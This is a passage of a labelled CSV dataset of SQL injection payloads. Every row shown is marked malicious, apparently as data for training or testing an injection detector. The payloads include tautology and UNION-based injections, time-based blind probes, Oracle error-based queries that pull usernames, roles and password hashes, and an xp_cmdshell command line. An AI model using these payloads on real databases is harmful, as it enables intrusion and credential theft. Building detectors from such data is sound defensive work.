row_index,payload_norm,label,sqli_type_hint
690,"""&""",1,
691,""" ) ) ;waitfor delay '0:0:__TIME__'--",1,
692,select * from users where id = 1 + ( \ ) or 1 = 1 -- 1,1,
693,select * from users where id = 1 or \+<\ or 1 = 1 -- 1,1,
694,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER ) WHERE LIMIT = 7 ) ) AND 'i' = 'i",1,
695,"select * from users where id = 1 + @`\` union select 1,version ( ) -- 1",1,
696,select * from users where id = 1 <@.. or 1 = 1 -- 1,1,
697,"select * from users where id = 1 or "";."" = 1 or 1 = 1 -- 1",1,
698,"select * from users where id = 1 or 1#""? = 1 union select 1,version ( ) -- 1",1,
699,"select * from users where id = 1 union select 1`\`,version ( ) -- 1",1,
700,"select * from users where id = 1 or "";&"" or 1 = 1 -- 1",1,
701,select * from users where id = '1' or \<1 or 1 = 1 -- 1',1,
702,"select * from users where id = '1' + ( \ ) union select 1,@@VERSION -- 1'",1,
703,t'exec master..xp_cmdshell 'nslookup www.googl ...,1,
704,""" ) or benchmark ( 10000000,MD5 ( 1 ) ) #",1,
705,"select * from users where id = 1 or $ 1 = 1 union select 1,@@VERSION -- 1",1,
706,select * from users where id = '1' or $<\ or 1 = 1 -- 1',1,
707,select,1,
708,""" or 1 = 1--",1,
709,a' or 'a' = 'a,1,
710,"select * from users where id = '1' <@._ union select 1,version ( ) -- 1'",1,
711,"select * from users where id = 1 or @#"" ( = 1 union select 1,version ( ) -- 1",1,
712,"admin"" ) or ( ""1"" = ""1""/*",1,
713,"select * from users where id = '1' or \.<$ union select 1,@@VERSION -- 1'",1,
714,"select * from users where id = '1' union select ( 1 ) ,banner from v$version where rownum = 1 -- 1'",1,
715,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 5 ) ) AND 'i' = 'i",1,
716,AND 1 = utl_inaddr.get_host_address ( ( SELECT COUNT ( DISTINCT ( GRANTED_ROLE ) ) FROM DBA_ROLE_PRIVS WHERE GRANTEE = SYS.LOGIN_USER ) ) AND 'i' = 'i,1,
717,"select * from users where id = 1 or 1#"" ( union select null,version ( ) -- 1",1,
718,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 6 ) ) AND 'i' = 'i",1,
719,"select * from users where id = 1 or "".#"" or 1 = 1 -- 1",1,
